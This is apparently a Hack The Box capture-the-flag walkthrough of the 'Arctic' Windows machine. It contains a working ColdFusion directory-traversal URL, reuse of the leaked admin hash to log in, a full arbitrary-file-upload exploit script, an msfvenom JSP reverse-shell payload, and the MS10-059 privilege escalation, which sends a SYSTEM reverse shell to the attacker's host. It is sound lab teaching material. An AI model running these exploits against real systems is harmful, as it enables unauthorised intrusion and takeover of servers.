# Hack The Box - Artic Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.11    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-04 00:57 EST
Nmap scan report for 10.10.10.11
Host is up (0.45s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.49 seconds
```

We get back the following result showing that 3 ports are open:
- Port `135`: running `Microsoft Windows RPC`.
- Port `8500`: running `fmtp?`
- Port `49154`: running `Microsoft Windows RPC`

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ rustscan -a 10.10.10.11 --ulimit 5000 --range 1-65535
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.11:135
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 135 10.10.10.11

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-04 01:00 EST
Initiating Ping Scan at 01:00
Scanning 10.10.10.11 [2 ports]
Completed Ping Scan at 01:00, 3.01s elapsed (1 total hosts)
Nmap scan report for 10.10.10.11 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds
```

But I noticed this wierd thing. `Nmap` results showed that there were 3 open ports while `rustscan` could only find 1 open port.

So, I decided to run the `nmap` scan on all ports too.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ sudo nmap -sC -sV -O -p- -oA nmap/full 10.10.10.11 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-04 01:01 EST
Stats: 0:14:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 54.34% done; ETC: 01:27 (0:11:53 remaining)
Stats: 0:26:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.52% done; ETC: 01:27 (0:00:00 remaining)
Nmap scan report for 10.10.10.11
Host is up (0.27s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc?
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1612.39 seconds
```

Now, that I've confirmed that there were only 3 ports open, i decided to move to the `enumeration` part

## Enumeration
I started by visiting the port `8500`, because other ports were just running `Microsoft Windows RPC`, which honestly is of no use to us while enumerating.

![arc-1](https://user-images.githubusercontent.com/87711310/216752955-6326fabd-0c87-4504-aea8-eae0f740ceba.png)

I found two directories: `/CFIDE` & `/cfdocs` on the page, and alse expreinced some kind of delay after every request that I sent. I dont know if it was intentional by the machine or if it was just on my side.

Inside the `/CFIDE` directory, there was a `/administrator` directory, and on visiting it I found a login page of `Adone ColdFusion`.

I have never heard about `Adobe ColdFusion`, so I guess either its too niche softwawre used for only a specific kind of work or it is a very old software and by looking at the UI, i think its an old software.

![arc-2](https://user-images.githubusercontent.com/87711310/216760387-ed76bfb9-39e8-4385-b6f4-cee16fb94167.png)

I tried default credentials, but it didn't work and I dont know if password cracker would work.

So, on googling `adobe coldfusion exploit`, I found a `Directory Traversal` Exploit.

![arc-3](https://user-images.githubusercontent.com/87711310/216760389-f5e2336c-1158-4edc-a084-25cfdb31c4be.png)

I opened it up and looked at its working and it was just a simple directory traversal, that would give me `admin's password hash`

![arc-4](https://user-images.githubusercontent.com/87711310/216760390-d1777b60-de92-4c6c-95cd-9fae4cb0dff4.png)

Now, I went back to the web-site and navigated to the above displayed URL to display the content of the password.properties file.

```
http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

And the password was displayed on the screen.

![arc-5](https://user-images.githubusercontent.com/87711310/216760411-9937aa48-04dc-4a5f-9f76-bce4a0b11909.png)

The password seems to be hashed, so I can’t simply use it in the password field. Before trying to crack the password, I decided to take a look at the source to find out whether I could use this hash without decrypting it.

From the source-code, I found this one line that I thought might be useful.

```
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```

From this, I could figure out a few things.
- The password is taken from the password field and hashed using `SHA1`. This is done on the client side.
- Then the hashed password is `HMAC`-ed using a salt value taken from the parameter salt field. This is also done on the client side.
- The HMAC-ed password gets sent to the server with the salt value. Then the server (assumption) might verify that HMAC-ed hashed password with the correct salt value.

So, the password we obtained was not in the plaintext format, but rather was in a hashed format.

```
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

From here there’s two ways to go. This hash is easily cracked, and in fact is already cracked in [CrackStation](http://crackstation.net/):

![arc-6](https://user-images.githubusercontent.com/87711310/216760414-a541cec7-e92d-48ef-8d0a-7c1d553a3572.png)

I can enter `happyday` into the password field and it successfully logs in.

However, the other way involves using JavaScript's `document.loginform.salt.value` to get the hash that's submitted to the webpage before being HMAC-ed.

For doing this, you can go to the Firefox developer tools, and use the following code in the console to get back a hex-ed value.

```
console.log(hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'));
```

Now, after running the above code in the developer tools, you'll get a hash, which you can use Burp, to intercept the trafic, sent it to the repeater and change the value of the `cfadminPassword` to the vlaue you retrived from running the above script and hit send.

Once you do that wait for a few moments and you'll see a `200 OK` response 

![arc-7](https://user-images.githubusercontent.com/87711310/216760415-65bb03d8-99cc-43e6-8b31-ddc5b8646abf.png)

And visiting the webpage, I was in the Admin's account and was displayed a dashboard.

![arc-8](https://user-images.githubusercontent.com/87711310/216760429-ca1dd989-e49b-4bb7-9b1a-8c231ed8b0f7.png)

## Gaining Initial Foothold.
Now, that we're into the admin panel, we can try to upload a reverse shell and run it to obtain a shell on out machine. 

To do that go to `Scheduled Tasks` and click on `Schedule New Task` to upload file.

![arc-9](https://user-images.githubusercontent.com/87711310/216760431-f6f95931-480b-4a4b-a740-33a4096f2adc.png)

For this box, I used [Arrexal’s exploit](https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload). He created a custom exploit for this box particularly. So Kudos to him!!

Now, I used `msfvenom` to create a `java` payload.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 > shell.jsp

Payload size: 1496 bytes
```
Before running the exploit, lets take a look at it. I saved this exploit as `arb-file-exploit.py` on my machine.
```python
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'

try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
```

Now, run the exploit.

```
python arb-file-exploit.py 10.10.10.11 8500 shell.jsp
````

Once, the exploit is sent, it tells us the location where its stored.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ python arb-file-exploit.py 10.10.10.11 8500 shell.jsp
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

I started a netcat listener.

```
nc lvnp 4444
```

And then, visited the location of the exploit in the browser to run the shell.jsp file.

```
http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

Looking back at the `netcat` listener, I got a shell

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49869
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

I grabbed the user flag.
```
C:\Users\tolis\Desktop>type user.txt
type user.txt
[REDACATED]
```

## Privilge Escalation.

Now, I used `systeminfo` to get information about the machine, to use it in `Windows Expliot Suggester`

```
C:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          5/2/2023, 3:44:19 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.101 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.277 MB
Virtual Memory: In Use:    1.008 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

Given the complete lack of hotfixes, this is likely vulnerable to an exploit. I can use the `sysinfo` results to run `Windows Exploit Suggester`. I’ll clone the repo into `/opt`:

```
┌──(darshan㉿kali)-[/opt]
└─$ git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
Cloning into 'Windows-Exploit-Suggester'...          
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 6.27 MiB/s, done.
Resolving deltas: 100% (72/72), done. 
```

I’ll also need to install the Python xlrd library with 

```
python -m pip install xlrd
```

First, I’ll create a database:
```
┌──(darshan㉿kali)-[~]
└─$ /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-05-13-mssb.xls                 
[*] done
```

Now I can run that against the `sysinfo` output:
```
┌──(darshan㉿kali)-[~]
└─$ /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Looking at those, as I’m not as interested in MSF modules to start, and as IE is likely to require user interaction, ones to look into are:

- MS10-047
- MS10-059
- MS10-061
- MS10-073
- MS11-011
- MS13-005

After viewing some blogs, I found out that `MS10-059` was the exploit that is supposed to be used to gain `priv-esc`.

I did some googling around for exploit code and found [this GitHub from egre55](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri) that included an exploit for MS10-059. I was particularly drawn to the fact that this binary requires an IP and port to connect to. Many of the exploits will start a new cmd as SYSTEM, which is nice if you are standing at the computer, but not so useful from a remote shell.

I downloaded the binary (while it’s never a great idea to run exes downloaded directly from the internet, for a CTF environment, I’m willing to run it), and ran `smbserver.py share .` to share my current directory.

Then in my shell, I copied it to Arctic:

```
C:\ColdFusion8\wwwroot\userfiles\file>net use \\10.10.16.4\share 
net use \\10.10.16.4\share
The command completed successfully.


C:\ColdFusion8\wwwroot\userfiles\file>copy \\10.10.16.4\share\Chimichurri.exe .     
copy \\10.10.16.4\share\Chimichurri.exe .
        1 file(s) copied.
```


Now I start a nc listener, and run it:

```
C:\ColdFusion8\wwwroot\userfiles\file>.\Chimichurri.exe 10.10.16.4 8888
.\Chimichurri.exe 10.10.16.4 8888
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

Visiting the netcat listener, I got a shell
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Artic]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 50113
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\wwwroot\userfiles\file>whoami
whoami
nt authority\system
```

From here, I grabbed the `root.txt`

```
C:\ColdFusion8\wwwroot\userfiles\file>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Users\Administrator\Desktop

22/03/2017  09:02 ��    <DIR>          .
22/03/2017  09:02 ��    <DIR>          ..
05/02/2023  03:45 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.433.055.232 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
[REDACTED]

```
